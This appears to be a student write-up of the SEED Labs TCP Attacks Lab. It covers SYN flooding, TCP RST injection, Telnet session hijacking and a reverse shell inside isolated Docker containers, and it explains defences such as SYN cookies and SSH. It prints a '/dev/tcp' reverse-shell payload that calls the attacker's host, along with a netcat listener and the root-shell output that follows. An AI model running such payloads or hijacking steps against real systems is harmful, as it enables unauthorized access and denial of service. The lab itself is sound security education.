# TCP Attacks Lab
 
**Course:** Network Security — SEED Labs  
**Topic:** SYN Flooding, TCP RST Attack, Session Hijacking & Reverse Shell

---

## 📋 Table of Contents
- [Lab Overview](#lab-overview)
- [Lab Setup Environment](#lab-setup-environment)
- [Network Topology](#network-topology)
- [Project Files](#project-files)
- [Task 1: SYN Flooding Attack](#task-1-syn-flooding-attack)
  - [Task 1.1: Attack Using Python](#task-11-attack-using-python)
  - [Task 1.2: Attack Using C](#task-12-attack-using-c)
  - [Task 1.3: SYN Cookie Countermeasure](#task-13-syn-cookie-countermeasure)
- [Task 2: TCP RST Attack on Telnet](#task-2-tcp-rst-attack-on-telnet)
- [Task 3: TCP Session Hijacking](#task-3-tcp-session-hijacking)
- [Task 4: Reverse Shell via Session Hijacking](#task-4-reverse-shell-via-session-hijacking)
- [Key Observations](#key-observations)

---

## Lab Overview

This lab explores three classic **TCP protocol attacks** that exploit the lack of authentication in the TCP/IP stack:

- **SYN Flooding** — exhaust the victim's half-open connection queue (DoS)
- **TCP RST Attack** — forcibly terminate an existing TCP connection
- **TCP Session Hijacking** — inject arbitrary commands into a live Telnet session
- **Reverse Shell** — extend hijacking to give the attacker an interactive shell

All attacks are performed inside a SEED Lab Docker environment using Python (Scapy) and C.

---

## Lab Setup Environment

### Step 1 — Download the Lab Setup
1. Open the SEED VM and launch **Firefox**
2. Go to: **SEED Labs → Network Security → TCP Attacks Lab**
3. Download the **labsetup.zip** file

### Step 2 — Prepare the Lab Directory
```bash
# Move to Documents > TCP_Attacks and unzip
unzip labsetup.zip

# Right-click inside the Labsetup folder → Open Terminal
```

### Step 3 — Build and Start Docker Containers
```bash
cd ~/TCP_Attacks/Labsetup

dcbuild    # Build container images
dcup       # Start all containers
```

### Step 4 — List Running Containers
```bash
dockps

# Example output:
# a1b2c3d4e5f6  attacker-10.9.0.105
# b2c3d4e5f6a1  victim-10.9.0.5
# c3d4e5f6a1b2  user1-10.9.0.6
```

### Step 5 — Connect to Containers
```bash
docksh a1    # Attacker container
docksh b2    # Victim container
docksh c3    # User1 container
```

### Step 6 — Find the Bridge Interface Name
```bash
# On the host machine
ip addr | grep br-
# Note the name (e.g. br-a1b2c3d4e5f6)
# Update INTERFACE variable in all .py scripts
```

---

## Network Topology

| Container | IP Address | Role |
|-----------|-----------|------|
| Attacker | 10.9.0.105 | Launches all attacks |
| Victim | 10.9.0.5 | Telnet server (target) |
| User1 | 10.9.0.6 | Telnet client (legitimate user) |

All three containers are on the same LAN (`10.9.0.0/24`), allowing the attacker to sniff traffic.

---

## Project Files

| File | Task | Description |
|------|------|-------------|
| `syncflood.py` | Task 1.1 | SYN flood attack using Python + Scapy |
| `synflood.c` | Task 1.2 | SYN flood attack using raw C sockets |
| `rst_attack.py` | Task 2 | TCP RST attack to kill Telnet sessions |
| `session_hijack.py` | Task 3 | TCP session hijacking — inject commands |
| `reverse_shell.py` | Task 4 | Inject reverse shell via session hijacking |

---

## Task 1: SYN Flooding Attack

### Background

A TCP connection starts with a **three-way handshake**:
1. Client sends **SYN**
2. Server replies **SYN-ACK** and stores a half-open entry in the backlog queue
3. Client sends **ACK** — connection established

**SYN Flooding** exploits step 2: by sending thousands of SYNs with **spoofed source IPs**, the attacker fills the victim's backlog queue. Since the spoofed sources never send the final ACK, the queue never drains. Legitimate clients cannot connect → **Denial of Service**.

### Check Queue Status
```bash
# On Victim container
netstat -nat           # View all TCP connections and their states
ss -n | head           # Alternative to netstat

# Set backlog queue size (smaller = easier to fill)
sysctl -w net.ipv4.tcp_max_syn_backlog=80

# View cached TCP metrics (kernel mitigation)
ip tcp_metrics show
```

---

### Task 1.1: Attack Using Python

**Script:** `syncflood.py`

**How it works:**
- Sends continuous TCP SYN packets with random spoofed source IPs and ports
- Each SYN causes victim to allocate a half-open queue entry
- Queue fills → legitimate Telnet connections are rejected

**Before the attack — verify Telnet works:**
```bash
# On User1 container
telnet 10.9.0.5
# Should connect successfully
```

**Run the attack (Attacker container):**
```bash
chmod a+x syncflood.py
python3 syncflood.py
```

**Monitor queue on Victim (separate terminal):**
```bash
# On Victim container
netstat -nat | grep SYN_RECV | wc -l   # Count half-open connections
netstat -nat | grep SYN_RECV           # See the flooded queue
```

**Try Telnet from User1 during attack:**
```bash
telnet 10.9.0.5
# Connection times out → Attack successful ✅
```

#### ✅ Output / Observation
- `netstat` shows the SYN queue filling with entries from random spoofed IPs all in `SYN_RECV` state
- Legitimate Telnet from User1 times out — connection refused
- **Attack was successful**

---

### Task 1.2: Attack Using C

**Script:** `synflood.c`

The C version uses raw sockets for higher packet throughput than Python.

**Compile and run:**
```bash
# On Attacker container
gcc -o synflood synflood.c
./synflood 10.9.0.5 23 100
# Arguments: <victim_ip> <port> <packets_per_second>
```

#### ✅ Output / Observation
- C version sends packets faster than Python, filling the queue more quickly
- **Attack was successful** — same result as Python version but with higher throughput

---

### Task 1.3: Enable the SYN Cookie Countermeasure

**SYN Cookies** defend against SYN flooding. Instead of storing a half-open entry in the queue, the server encodes connection state into the initial sequence number (ISN) as a cryptographic cookie. No queue entry is needed until the ACK arrives — so the queue cannot be exhausted.

**Enable SYN Cookies on Victim:**
```bash
# On Victim container
sysctl -w net.ipv4.tcp_syncookies=1    # Turn ON SYN cookies
```

**Launch the flood again, then test Telnet:**
```bash
# Attacker — run syncflood.py again

# User1 — try Telnet
telnet 10.9.0.5
# Connected! ✅
```

**Disable SYN Cookies (restore vulnerable state):**
```bash
sysctl -w net.ipv4.tcp_syncookies=0    # Turn OFF
```

#### ✅ Output / Observation
- With SYN cookies **enabled**: Telnet from User1 connects successfully even during the flood
- With SYN cookies **disabled**: Telnet times out during the flood
- SYN cookies completely neutralize the SYN flooding attack

---

## Task 2: TCP RST Attack on Telnet

**Script:** `rst_attack.py`

### Background

A TCP RST (Reset) segment causes the receiving end to **immediately abort** the connection. Normally, RSTs are sent by a host that receives a packet for a non-existent connection. An attacker on the same LAN can:
1. Sniff a live TCP packet from the Telnet session to learn the current sequence number
2. Forge a RST packet with a valid sequence number
3. Send it to one side of the connection → connection terminates instantly

### Setup — Establish Telnet Session

```bash
# On User1 container
telnet 10.9.0.5
# Login: seed / Password: dees
# Keep this session open
```

### Run the Attack

```bash
# On Attacker container — update INTERFACE in rst_attack.py first
python3 rst_attack.py
```

### Observe in Wireshark

Open Wireshark on the host/attacker and filter: `tcp.flags.reset == 1`

**Expected Wireshark output:**
- A forged TCP RST packet appears from the victim's IP with a valid sequence number
- The Telnet session on User1 immediately drops with `Connection closed by foreign host`

#### ✅ Output / Observation
- After running `rst_attack.py`, the Telnet session on User1 was **terminated instantly**
- Wireshark shows the RST packet with matching sequence number
- Clicking on the RST packet in Wireshark shows the forged source IP/port matching the victim
- **Attack successful**

---

## Task 3: TCP Session Hijacking

**Script:** `session_hijack.py`

### Background

TCP has no authentication — any packet with the correct `src IP`, `dst IP`, `src port`, `dst port`, and **sequence number** will be accepted by the OS. Session hijacking exploits this:

1. Attacker sniffs a live Telnet packet to learn current seq/ack numbers
2. Forges a packet **impersonating the client (User1)**
3. Sends it to the Victim server with an arbitrary command payload
4. Victim's server executes the injected command as if User1 typed it

### Setup — Establish Telnet Session

```bash
# On User1 container
telnet 10.9.0.5
# Login and keep session open (type something so there are packets to sniff)
```

### Run the Attack

```bash
# On Attacker container
python3 session_hijack.py
```

**Then type something in the User1 terminal to trigger a packet**

#### ✅ Output / Observation
- The script captures a live packet, extracts seq/ack numbers
- Injects `touch /tmp/hijacked` (or the configured command) to the Victim
- On the Victim: `ls /tmp/hijacked` confirms the file was created
- User1's terminal becomes desynchronized (garbled output)
- **Attack successful**

---

## Task 4: Reverse Shell via Session Hijacking

**Script:** `reverse_shell.py`

### Background

Instead of running a single command, this task **injects a reverse shell payload**. The victim's bash opens a TCP connection back to the attacker and maps stdin/stdout through it, giving the attacker a fully interactive shell on the victim machine — without needing a password.

### Reverse Shell Payload
```bash
/bin/bash -i > /dev/tcp/10.9.0.105/9090 0<&1 2>&1
```
This redirects bash's stdin, stdout, and stderr to a TCP socket connecting to the attacker at `10.9.0.105:9090`.

### Step-by-Step

**Step 1 — Start Netcat listener on Attacker:**
```bash
# On Attacker container (Terminal 1)
nc -lnvp 9090
# Waiting for incoming connection...
```

**Step 2 — Establish Telnet on User1:**
```bash
telnet 10.9.0.5
# Login and keep alive
```

**Step 3 — Run reverse shell injector (Attacker Terminal 2):**
```bash
python3 reverse_shell.py
```

**Step 4 — Trigger a packet from User1 terminal (type anything)**

**Step 5 — Check the netcat listener:**
```bash
# Netcat terminal now shows:
# Connection received on 10.9.0.5 49xxx
# root@victim:/#       ← Interactive shell!
```

#### ✅ Output / Observation
- Netcat listener receives connection from Victim (`10.9.0.5`)
- Attacker now has a **root shell** on the Victim machine
- Commands typed in netcat run on the Victim:
  ```
  root@victim:/# whoami
  root
  root@victim:/# id
  uid=0(root) gid=0(root) groups=0(root)
  ```
- The connection was terminated after demonstration
- **Attack successful**

---

## Key Observations

| Task | Attack | Result | Defense |
|------|--------|--------|---------|
| 1.1 | SYN Flood (Python) | Telnet blocked — queue full | SYN Cookies |
| 1.2 | SYN Flood (C) | Faster flood — same result | SYN Cookies |
| 1.3 | SYN Cookie enabled | Telnet works during flood | `tcp_syncookies=1` |
| 2 | TCP RST Attack | Telnet session killed instantly | Encrypted sessions (SSH) |
| 3 | Session Hijacking | Command injected as legitimate user | SSH (encrypted + authenticated) |
| 4 | Reverse Shell | Full root shell on victim | SSH + network segmentation |

> **Security Takeaway:** All four attacks exploit the **absence of authentication and encryption** in the TCP/IP protocol and the Telnet application. The universal defense is **SSH**, which provides:
> - Encrypted traffic (prevents sniffing sequence numbers)
> - Mutual authentication (prevents session hijacking)
> - No plaintext credentials (prevents credential theft)
>
> At the network level, **SYN Cookies** (`net.ipv4.tcp_syncookies=1`) should always be enabled to mitigate SYN flooding without impacting legitimate traffic.

---

## Quick Reference — Useful Commands

```bash
# Check SYN queue (victim)
netstat -nat | grep SYN_RECV

# Enable/disable SYN cookies (victim)
sysctl -w net.ipv4.tcp_syncookies=1   # enable
sysctl -w net.ipv4.tcp_syncookies=0   # disable

# Set backlog queue size (victim)
sysctl -w net.ipv4.tcp_max_syn_backlog=80

# View TCP metrics cache
ip tcp_metrics show

# Start netcat listener (attacker)
nc -lnvp 9090

# Wireshark filters
tcp.flags.syn == 1 and tcp.flags.ack == 0   # SYN packets only
tcp.flags.reset == 1                          # RST packets
ip.src == 10.9.0.105                          # From attacker
```

---

*Lab completed as part of the SEED Labs Network Security curriculum.*
